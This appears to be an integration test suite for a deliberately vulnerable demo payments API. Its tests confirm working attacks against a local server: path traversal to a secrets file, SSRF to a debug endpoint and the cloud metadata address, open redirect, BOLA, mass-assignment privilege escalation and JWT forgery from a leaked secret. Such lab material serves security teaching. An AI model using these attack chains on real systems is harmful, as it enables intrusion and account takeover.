/**
 * Integration tests that drive the same failure modes as attack.mjs.
 */

import { createHmac } from "node:crypto";
import { describe, it, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { createApp } from "../server/app.js";
import db from "../server/db.js";

function signHs256(payloadObj, secret) {
  const b64url = (input) =>
    Buffer.from(typeof input === "string" ? input : JSON.stringify(input))
      .toString("base64")
      .replace(/=/g, "")
      .replace(/\+/g, "-")
      .replace(/\//g, "_");
  const header = b64url({ alg: "HS256", typ: "JWT" });
  const payload = b64url(payloadObj);
  const data = `${header}.${payload}`;
  const sig = createHmac("sha256", secret)
    .update(data)
    .digest("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
  return `${data}.${sig}`;
}

let server;
let base;

before(async () => {
  const { app } = createApp();
  server = await new Promise((resolve) => {
    const s = app.listen(0, "127.0.0.1", () => resolve(s));
  });
  base = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  await new Promise((resolve) => server.close(resolve));
});

beforeEach(() => db.reset());

async function http(method, path, opts = {}) {
  const res = await fetch(`${base}${path}`, {
    method,
    headers: {
      Accept: "application/json, text/plain, */*",
      ...(opts.body ? { "Content-Type": "application/json" } : {}),
      ...(opts.headers || {}),
    },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
    redirect: "manual",
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* ignore */
  }
  return { status: res.status, headers: res.headers, text, json };
}

describe("attack probes — unauthenticated chain", () => {
  it("recon health", async () => {
    const res = await http("GET", "/api/health");
    assert.equal(res.status, 200);
  });

  it("user dump without token", async () => {
    const res = await http("GET", "/api/users");
    assert.equal(res.status, 200);
    assert.ok(res.json.total >= 4);
  });

  it("path traversal secret file", async () => {
    const res = await http("GET", "/api/files?name=../secrets/jwt-backup.txt");
    assert.equal(res.status, 200);
    assert.match(res.text, /JWT_SECRET=supersecret123/);
  });

  it("open redirect", async () => {
    const res = await http("GET", "/api/go?url=https://phish.example/");
    assert.equal(res.status, 302);
    assert.match(res.headers.get("location") || "", /phish\.example/);
  });

  it("SSRF open proxy to self debug config", async () => {
    const loop = `${base}/api/debug/config`;
    const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`);
    assert.equal(res.status, 200);
    assert.match(res.text, /jwtSecret|supersecret/);
  });

  it("login flood sees no 429", async () => {
    const N = 25;
    const results = await Promise.all(
      Array.from({ length: N }, (_, i) =>
        http("POST", "/api/auth/login", {
          body: { email: `flood-${i}@test.local`, password: "x" },
        })
      )
    );
    const statuses = results.map((r) => r.status);
    assert.equal(statuses.filter((s) => s === 429).length, 0);
    assert.ok(statuses.filter((s) => s === 401).length >= N * 0.8);
  });

  it("missing security headers on health", async () => {
    const res = await http("GET", "/api/health");
    assert.equal(res.headers.get("x-frame-options"), null);
    assert.equal(res.headers.get("content-security-policy"), null);
  });

  it("CORS allows evil Origin with *", async () => {
    const res = await http("GET", "/api/health", {
      headers: { Origin: "https://evil-attacker.example" },
    });
    assert.equal(res.status, 200);
    const acao = res.headers.get("access-control-allow-origin");
    assert.ok(acao === "*" || acao === "https://evil-attacker.example");
  });

  it("open proxy accepts cloud-metadata class URL (may fail upstream off EC2)", async () => {
    const res = await http(
      "GET",
      `/api/proxy?url=${encodeURIComponent("http://169.254.169.254/latest/meta-data/")}`
    );
    // Vulnerable app must not refuse the URL at the route (404 = endpoint missing).
    // 200 / 502 / timeout-as-502 are all "proxy tried" — not a missing route.
    assert.notEqual(res.status, 404);
  });
});

describe("attack probes — authenticated abuse chain", () => {
  async function alice() {
    const res = await http("POST", "/api/auth/login", {
      body: { email: "alice@example.com", password: "password123" },
    });
    assert.equal(res.status, 200);
    return res.json;
  }

  it("BOLA orders", async () => {
    const { token, user } = await alice();
    const res = await http("GET", "/api/orders", {
      headers: { Authorization: `Bearer ${token}` },
    });
    assert.equal(res.status, 200);
    assert.ok(res.json.orders.some((o) => o.userId !== user.id));
  });

  it("privilege escalation via mass assignment", async () => {
    const { token, user } = await alice();
    const res = await http("PUT", `/api/users/${user.id}`, {
      headers: { Authorization: `Bearer ${token}` },
      body: { role: "admin" },
    });
    assert.equal(res.status, 200);
    assert.equal(res.json.user.role, "admin");
  });

  it("admin stats with user JWT after escalation", async () => {
    const { token, user } = await alice();
    await http("PUT", `/api/users/${user.id}`, {
      headers: { Authorization: `Bearer ${token}` },
      body: { role: "admin" },
    });
    const res = await http("GET", "/api/admin/stats", {
      headers: { Authorization: `Bearer ${token}` },
    });
    assert.equal(res.status, 200);
    assert.ok(res.json.accounts.length >= 4);
  });

  it("forge admin token from leaked secret", async () => {
    const dbg = await http("GET", "/api/debug/config");
    const now = Math.floor(Date.now() / 1000);
    const forged = signHs256(
      {
        sub: 3,
        email: "admin@vaultpay.demo",
        role: "admin",
        name: "X",
        iat: now,
        exp: now + 3600,
      },
      dbg.json.jwtSecret
    );
    const me = await http("GET", "/api/me", {
      headers: { Authorization: `Bearer ${forged}` },
    });
    assert.equal(me.status, 200);
    assert.equal(me.json.user.role, "admin");
  });
});
